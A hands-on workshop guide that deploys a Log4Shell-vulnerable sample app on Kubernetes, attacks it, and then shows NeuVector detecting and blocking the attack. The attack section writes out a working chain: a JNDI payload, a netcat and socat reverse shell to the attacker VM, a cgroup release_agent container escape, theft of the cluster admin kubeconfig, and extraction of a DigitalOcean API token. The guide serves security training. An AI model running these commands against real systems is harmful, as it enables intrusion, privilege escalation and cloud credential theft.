
# Step 1 - Installing the Kubernetes application
1. Login into your victim machine via ssh with username and passwort
2. Switch to into the yaml directory
```
cd /tmp/yaml
```

3. apply the the needed yaml files to deploy the sample application and the ingress to access it.
```
kubectl apply -f /tmp/yaml/sample_app_deployment.yml
```

```
kubectl apply -f /tmp/yaml/sample_app_service_ingress.yml
```

4. Access the application via Browser. You can get the URL from the ingress yaml file.
```
cat /tmp/yaml/sample_app_service_ingress.yml
```

5. Copy the URL into your Browser and take a look. 
6. Create digital ocean token.
```
kubectl apply -f /tmp/yaml/digital_ocean_token.yml
```

# Step 2 - Install cert-manager

cert-manager is a Kubernetes add-on to automate the management and issuance of TLS certificates from various issuing sources.

The following set of steps will install cert-manager which will be used to manage the TLS certificates for NeuVector.

## Run the following commands on the victim VM.

First, we'll add the helm repository for Jetstack

```
helm repo add jetstack https://charts.jetstack.io
```

Now, we can install cert-manager:

```
helm install cert-manager jetstack/cert-manager \
  --namespace cert-manager \
  --set installCRDs=true \
  --create-namespace
```

Once the helm chart has installed, you can monitor the rollout status of both `cert-manager` and `cert-manager-webhook`

```
kubectl -n cert-manager rollout status deploy/cert-manager
```

You should eventually receive output similar to:

`Waiting for deployment "cert-manager" rollout to finish: 0 of 1 updated replicas are available...`

`deployment "cert-manager" successfully rolled out`

```
kubectl -n cert-manager rollout status deploy/cert-manager-webhook
```

# Step 3 - Installing NeuVector
```
helm repo add neuvector https://neuvector.github.io/neuvector-helm/
```
In order to automatically generate a selfsigned TLS certificate for NeuVector, we have to configure a ClusterIssuer in cert-manager, that the NeuVector helm chart can reference:
```
kubectl apply -f /tmp/yaml/nv_clusterIssuer_certificate.yml
```
You can find more information in the [cert-manager docs](https://cert-manager.io/docs/).

Finally, we can install NeuVector using our `helm install` command.
```
helm install neuvector neuvector/core \
  --namespace cattle-neuvector-system \
  -f /tmp/yaml/neuvector-values.yml \
  --create-namespace
```

# Step 4 - Prepare the Attack
Let's install an application that poses as an LDAP server and provider a Java class to the vulnerable application which will create a remote connection back to the **attacker VM**. Login into the attacker machine with username and password via SSH. 

1. Change the promt to identify the shell.

```
export VM=attacker
PS1="\u@$VM:\w>"
```

2. Then we need to set the variable for the public IP address. There is also a file called puplic-ip which is stored in the /tmp folder.

```
export PUBLIC_IP=<public ip address>
```

3. Install needed packages and download the app
```
sudo zypper in -y python3 socat
```

```
wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/poc.py
wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/requirements.txt
mkdir ~/target
wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/target/marshalsec-0.0.3-SNAPSHOT-all.jar -P ~/target
pip3 install -r requirements.txt
```

4. Download a vulnerable JDK

```
wget https://download.java.net/openjdk/jdk8u43/ri/openjdk-8u43-linux-x64.tar.gz
tar -xvf openjdk-8u43-linux-x64.tar.gz
mv java-se-8u43-ri/ jdk1.8.0_20
```

4. Now we can run the python app that provides the exploit
```
sudo python3 poc.py --userip ${PUBLIC_IP} --webport 80 --lport 443 &
```

5. And start listening for remote shells
```
sudo nc -lvnp 443
```

## Run the following commands on a second shell on the  attacker VM.
open a second shell to the attacker VM and we name it **attacker2**

```
export VM2=attacker2
PS1="\u@$VM2:\w>"
```

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

# Step 4 - Run attack

Now let's start the attack. The following HTTP request triggers a log4shell vulnerability because the app logs the user agent.

Because of that log4j will connect to the attacker's LDAP server, which will provide a Java class that gets executed by the sample app and create a remote shell from the container to the attacker's netcat session:

## Run the following commands on the victim VM
```
curl http://sample-app.default.${PUBLIC_IP}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://${ATTACKER_PUBLIC_IP}:1389/a}'
```
The first shell on the **attacker VM** now received a remote shell from the container.

## Run the following commands on the first attacker terminal.

We can list the container filesystem

```
ls -la
```

or the running processes

```
ps auxf
```

Let's try to install kubectl into the container

```
curl -LO --insecure "https://dl.k8s.io/release/$(curl -L -s --insecure https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/
```

And access the Kubernetes API. This should create an error, because the Pod's ServiceAccount does not have any permissions to access the Kubernetes API:

```
kubectl get pods
```

Let's try something else and list the Linux capabilities of the container

```
capsh --print
```

Not that our container does not have `cap_sys_admin` capabilities.

Let's try to change this by exploiting a Kernel vulnerability:

```
unshare -UrmC bash
capsh --print
```

Now that we have `cap_sys_admin` capabilities. We can try to exploit another Kernel bug to break out of the container and create a second remote shell from the host system to the second terminal on the **attacker VM**.

Create a new RDMA cgroup

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

Enables cgroup notifications on release of the "x" cgroup

```
echo 1 > /tmp/cgrp/x/notify_on_release
```

Get the path of the OverlayFS mount for our container

```
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```

Set the release agent to execute `/{overlay_fs_host_path}/cmd` on the host (`/cmd` inside of the container) when the cgroup is released

```
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

Create the command, which will run socat and create a remote shell to the second shell on the **attacker VM**

```
echo '#!/bin/bash' > /cmd
echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ATTACKER_PUPLIC_IP}:4444" >> /cmd
chmod a+x /cmd
```

Run `echo` in the cgroup, which will directly exit and trigger the release agent cmd (execute `/{overlay_fs_host_path}/cmd`):

```
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Now we got a remote shell to the **second attacker shell**  where we are root directly on the **victim host**

**Run the following commands on the attacker02 VM.**

```
whoami
docker ps
```

Install kubectl

```
docker cp kubelet:/usr/local/bin/kubectl /usr/bin/
```

Get kubeconfig

```
kubectl --kubeconfig $(docker inspect kubelet --format '{{ range .Mounts }}{{ if eq .Destination "/etc/kubernetes" }}{{ .Source }}{{ end }}{{ end }}')/ssl/kubecfg-kube-node.yaml get configmap -n kube-system full-cluster-state -o json | jq -r .data.\"full-cluster-state\" | jq -r .currentState.certificatesBundle.\"kube-admin\".config | sed -e "/^[[:space:]]*server:/ s_:.*_: \"https://127.0.0.1:6443\"_" > kubeconfig_admin.yaml

export KUBECONFIG=$(pwd)/kubeconfig_admin.yaml
```

Now we are admin in the Kubernetes cluster

```
kubectl get pods -A
```


Download the digital ocean cli software
```
cd ~
wget https://github.com/digitalocean/doctl/releases/download/v1.94.0/doctl-1.94.0-linux-amd64.tar.gz
tar xf ~/doctl-1.94.0-linux-amd64.tar.gz
sudo mv ~/doctl /usr/bin
```

Get the cloud provider token

```
do_token=$(kubectl get secret -n kube-system digitalocean -o jsonpath="{.data.access-token}" | base64 --decode)
```

Try to log in with the token:

```
doctl auth init -t $do_token
```

# Break until everyone finished these steps

# Step 5 - Accessing NeuVector

***Note:*** NeuVector may not immediately be available at the link below, as it may be starting up still. Please continue to refresh until NeuVector is available.

First wait until all NeuVector Pods are up and running

## Run the following commands on the victim VM.

```kubectl get pods -n cattle-neuvector-system```

1. Access NeuVector at https://neuvector.cattle-neuvector-system.${PUBLIC_IP}.sslip.io.
2. For this Workshop, NeuVector is installed with a self-signed certificate from a CA that is not automatically trusted by your browser. Because of this, you will see a certificate warning in your browser. You can safely skip this warning. Some Chromium based browsers may not show a skip button. If this is the case, just click anywhere on the error page and type "thisisunsafe" (without quotes). This will force the browser to bypass the warning and accept the certificate.
3. Log in with the username "admin" and the default password "admin"
4. Make sure to agree to the Terms & Conditions

# Step 6 Looking deeper into NeuVector
## Looking for Vulnerabilities
### look at log4shell vulnerability and compliance
1. Highlight the poor status of the node
2. Go to **Security Risks** -> **Vulnerabilities**
3. Filter for **CVE-2021-45046**
4. Show another way on the **container** and go to **Assets** -> **Containers** -> **CVE-2021-45046**
5. Go to the **Compliance** tab and filter for **root** to the Compliance warning
### Show cgroup kernel vulnerability
1. Go to **Assets** -> **Nodes** -> Filter for CVE **CVE-2022-0492**
### Show Process Profile Rules 
1.  Go back to **Policy** ->  **Groups** and filter for **sample app**
2. Show the **Process Profile Rules**
3. Describe the **Discover** Mode
### Show the network Rules
1. Show the **network rules** of the **sample app**
## Show **Notification** -> **Security Events**
## Block socat on Node level
1. So we will block the socat process on the host level
2. Go To **Policy** -> **Groups** -> Select **nodes** -> **Actions**
    + •	Process name: socat
    + •	Path: /usr/bin/socat
    + •	Action: Deny
3. Switch into **Protect** Mode
4. Exit the terminal in the remote shell and try to trigger the c-group Event again
```
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
5. In NeuVector go to **Notification** -> **Security Event**
## Investigate running processes
1. Switch the Mode to **Protection** for the **sample-app** container
2. **Remove** not needed **processes** from the **sample app container**
3. Try to exectute the following command in the attacker terminal
   ```
   unshare -UrmC bash
   ```
4. Execute `ls` in the terminal and then delete it from the rules list and show the result
5. Take also a look into **Notification** -> **Security Events** to show the Critical Messages
## Deny remote Connection
1. Go To **Policy** -> **Network Rules**
2. Remove the **sample app -> external** connections
3. Go back to the terminal and try `ls` again and see, that there is no response
4. Cancel and open the netcat again:
```
sudo nc -lvnp 443
```
6. Do the curl again:
```
curl http://sample-app.default.{VICTIM_PUPLIC_IP}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://{ATTACKER_PUPLIC_IP}:1389/a}'
```
6. Look into  the notificaton
## Now we will block the Log4Shell itself
NeuVector's deep packet inspection also allow to scan and filter incoming and outgoing traffic with WAF (Web Application Firewall) and DLP (Data Loss Prevention) sensors.

Go to **Policy > WAF Sensors** to see the already pre-configured sensors. Here you can also activate your own. You can find more information at [DLP & WAF Sensors](https://open-docs.neuvector.com/policy/dlp).

To create a WAF rule that blocks the request from even reaching the sample-app

* Go to **Policy > Groups** and choose the `nv.sample-app.default` group.
* Go to the **WAF** tab
* Click on the edit button
* Choose the Log4Shell WAF sensor
* Click apply
* Set the WAF status toggle to **Enabled**
* Run the following command on the victim VM again
```
curl http://sample-app.default.${VICTIM_PUPLIC_IP}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://${ATTACKE_PUPLIC_IP}:1389/a}'
```
The request will be blocked. You can see a WAF alert under **Notifications > Security Events**.

For further forensics, you can download a package capture PCAP file directly from the alert.

## Use Admission Controll
Next we want to prevent a Pod to be run as root to begin with.

An admission controller in kubernetes is a small piece of software that will take the object being submitted to the API server and either allow it as-is, modify it, or block the resource from being added. In NeuVectors case, we want to block the deployment of workloads based on a set of security criteria.

By default, this is disabled. To enable, navigate to **Policy -> Admission Control**, and click the **Status** toggle.

Also make sure to switch the admission control to **Protect** mode.

Let us create a rule that will block pods running as root in the `default` namespace. For more information on other available criteria, please see [Admission](https://open-docs.neuvector.com/policy/admission).

Click **Add** and use the following settings:

* Type: Deny
* Comment: Deny root in default namespace

Then add two criterion.

First:

* Criterion: Namespace
* Operator: Is one of
* Value: default

Second:

* Criterion: Run as root

Note that you have to click the `+` icon for each criterion to actually add the rule that you configured in the form.

Delete the Pod again to force Kubernetes to recreate it

**Run the following commands on the victim VM.**

```
kubectl delete pod -n default -l app=sample-app
```

Kubernetes will now prevent the Pod creation. You can see this in the events of the Deployment's ReplicaSet:

```
kubectl describe replicaset
```

# Finish


